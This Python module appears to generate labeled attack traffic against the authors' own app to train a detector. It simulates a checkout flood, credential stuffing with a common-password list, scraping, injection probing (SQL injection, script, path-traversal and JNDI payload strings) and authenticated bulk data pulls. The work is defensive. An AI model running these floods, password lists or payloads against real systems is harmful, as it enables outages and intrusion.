"""The five attack scenarios, each against our OWN app (see _client.py scope).

Every function runs for `duration` seconds, concurrently with whatever normal
traffic is running, and returns an Episode (scope, category, start, end, #reqs)
so the run can be labeled. Shapes are realistic (ramp-up, jitter, tool UAs,
distinct attacker IPs, credential lists, real payload strings) but bounded.
"""

from __future__ import annotations

import random
import time

from _client import (
    ATTACKER_IPS,
    AUTH,
    PAY,
    Episode,
    http,
    run_concurrent,
)


def availability(duration=60, concurrency=40):
    """DoS on payment-api: ramped concurrent checkout flood → rate + latency spike."""
    start = time.time()

    def worker():
        ip = ATTACKER_IPS[0]  # a single bot front, as in a simple volumetric DoS
        http("POST", f"{PAY}/api/donations/checkout",
             {"amount": random.choice([1000, 2500]), "email": "flood@attack.test"},
             src_ip=ip, timeout=3)

    n = run_concurrent(worker, duration, concurrency, ramp=0.4)
    return Episode("payment-api", "availability", start, time.time(), n)


# Credential-stuffing list: common passwords an attacker would try. The app's
# accounts use strong seeded passwords, so these (almost) all fail — which is the
# realistic signal: a burst of 401s on /login from a couple of IPs.
COMMON_PASSWORDS = [
    "123456", "password", "azerty", "123456789", "qwerty",
    "admin", "motdepasse", "000000", "iloveyou", "welcome",
]
TARGET_EMAILS = [f"user{n}@octobre-rose.test" for n in range(1, 40)]


def auth_abuse(duration=60, concurrency=4):
    """Brute force / credential stuffing on /api/auth/login."""
    start = time.time()

    def worker():
        ip = random.choice(ATTACKER_IPS[:2])
        http("POST", f"{AUTH}/api/auth/login",
             {"email": random.choice(TARGET_EMAILS), "password": random.choice(COMMON_PASSWORDS)},
             src_ip=ip, timeout=4)

    n = run_concurrent(worker, duration, concurrency, ramp=0.2, jitter=(0.0, 0.1))
    return Episode("auth-service", "auth-abuse", start, time.time(), n)


def scraping(duration=60, concurrency=3):
    """Enumeration: hammer the public leaderboard from one bot IP."""
    start = time.time()
    ip = ATTACKER_IPS[2]

    def worker():
        http("GET", f"{PAY}/api/donations/leaderboard", src_ip=ip,
             ua="Mozilla/5.0 (compatible; scanbot/1.0)", timeout=4)

    n = run_concurrent(worker, duration, concurrency, ramp=0.1)
    return Episode("payment-api", "scraping", start, time.time(), n)


# Real probing payloads. The app uses parameterized queries + validation, so
# these cannot actually inject — but they produce the attacker's fingerprint
# (a burst of 400s / odd inputs across endpoints) the detector must learn.
INJECTION_PAYLOADS = [
    "' OR '1'='1", "'; DROP TABLE users;--", "\" OR 1=1--",
    "<script>alert(1)</script>", "../../../../etc/passwd",
    "${jndi:ldap://x}", "%27%20OR%201=1", "admin'--",
]


def injection(duration=60, concurrency=3):
    """Malformed / injection probing across inputs → 400s + suspicious shapes."""
    start = time.time()

    def worker():
        ip = ATTACKER_IPS[1]
        payload = random.choice(INJECTION_PAYLOADS)
        target = random.random()
        if target < 0.4:
            http("POST", f"{AUTH}/api/auth/login",
                 {"email": payload, "password": payload}, src_ip=ip, timeout=4)
        elif target < 0.7:
            http("POST", f"{AUTH}/api/auth/register",
                 {"email": payload, "password": payload, "displayName": payload},
                 src_ip=ip, timeout=4)
        else:
            http("POST", f"{PAY}/api/donations/checkout",
                 {"amount": payload, "email": payload}, src_ip=ip, timeout=4)

    n = run_concurrent(worker, duration, concurrency, ramp=0.1)
    return Episode("auth-service", "injection", start, time.time(), n)


def exfiltration(duration=60, concurrency=2):
    """Data harvesting: authenticate, then pull large result sets in a loop."""
    start = time.time()
    ip = ATTACKER_IPS[0]
    # Register one account to get a token (authenticated data access).
    token = None
    email = f"exfil{random.randint(1000,9999)}@attack.test"
    status, _, _ = http("POST", f"{AUTH}/api/auth/register",
                        {"email": email, "password": "exfil-strong-pw-1", "displayName": "x"},
                        src_ip=ip)
    if status == 201:
        import json as _json
        import urllib.request as _u
        req = _u.Request(f"{AUTH}/api/auth/login", method="POST",
                         data=_json.dumps({"email": email, "password": "exfil-strong-pw-1"}).encode(),
                         headers={"content-type": "application/json", "x-forwarded-for": ip})
        try:
            with _u.urlopen(req, timeout=4) as r:
                token = _json.loads(r.read()).get("token")
        except Exception:
            token = None

    def worker():
        # Large public dataset + authenticated history — volume of bytes_out.
        http("GET", f"{PAY}/api/donations/leaderboard", src_ip=ip, timeout=5)
        if token:
            http("GET", f"{PAY}/api/donations/history", token=token, src_ip=ip, timeout=5)

    n = run_concurrent(worker, duration, concurrency, ramp=0.1, jitter=(0.0, 0.2))
    return Episode("payment-api", "exfiltration", start, time.time(), n)


SCENARIOS = {
    "availability": availability,
    "auth-abuse": auth_abuse,
    "scraping": scraping,
    "injection": injection,
    "exfiltration": exfiltration,
}
